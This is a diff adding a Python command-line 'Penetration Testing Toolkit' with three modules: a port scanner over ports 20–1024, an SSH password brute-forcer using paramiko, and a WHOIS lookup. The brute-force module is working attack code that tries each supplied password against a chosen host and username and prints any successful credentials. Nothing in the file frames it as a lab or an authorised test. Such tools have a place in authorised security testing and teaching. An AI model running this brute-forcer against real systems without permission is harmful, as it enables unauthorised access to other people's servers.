@@ -1,0 +1,82 @@
+import socket
+import paramiko
+import whois
+
+# ========== Port Scanner ==========
+def scan_ports(host, ports):
+    print(f"\n[*] Scanning ports on {host}...")
+    open_ports = []
+    for port in ports:
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                sock.settimeout(0.5)
+                result = sock.connect_ex((host, port))
+                if result == 0:
+                    open_ports.append(port)
+                    print(f"[+] Port {port} is OPEN")
+        except Exception as e:
+            print(f"[-] Error on port {port}: {e}")
+    if not open_ports:
+        print("[-] No open ports found.")
+    return open_ports
+
+# ========== SSH Brute Forcer ==========
+def ssh_brute_force(host, username, password_list):
+    print(f"\n[*] Starting SSH brute force on {host} with user '{username}'...")
+    for password in password_list:
+        try:
+            client = paramiko.SSHClient()
+            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            client.connect(hostname=host, username=username, password=password, timeout=2)
+            print(f"[+] SUCCESS! Username: {username} | Password: {password}")
+            client.close()
+            return password
+        except paramiko.AuthenticationException:
+            print(f"[-] Failed: {password}")
+        except Exception as e:
+            print(f"[!] Connection error: {e}")
+    print("[-] Password not found in list.")
+    return None
+
+# ========== WHOIS Info Gatherer ==========
+def get_domain_info(domain):
+    print(f"\n[*] Performing WHOIS lookup on {domain}...")
+    try:
+        w = whois.whois(domain)
+        print("[+] WHOIS Info:")
+        print(f"  Domain Name: {w.domain_name}")
+        print(f"  Registrar: {w.registrar}")
+        print(f"  Creation Date: {w.creation_date}")
+        print(f"  Expiration Date: {w.expiration_date}")
+        print(f"  Emails: {w.emails}")
+    except Exception as e:
+        print(f"[-] WHOIS lookup failed: {e}")
+
+# ========== Main CLI ==========
+def main():
+    print("\n=== Penetration Testing Toolkit ===")
+    print("1. Port Scanner")
+    print("2. SSH Brute-Force")
+    print("3. WHOIS Info Gatherer")
+    choice = input("Select module (1/2/3): ")
+
+    if choice == "1":
+        target = input("Enter target IP address: ")
+        ports = list(range(20, 1025))
+        scan_ports(target, ports)
+
+    elif choice == "2":
+        target = input("Enter SSH server IP: ")
+        username = input("Enter SSH username: ")
+        passwords = input("Enter comma-separated passwords: ").split(',')
+        ssh_brute_force(target, username, passwords)
+
+    elif choice == "3":
+        domain = input("Enter domain (e.g., example.com): ")
+        get_domain_info(domain)
+
+    else:
+        print("[-] Invalid choice.")
+
+if __name__ == "__main__":
+    main()
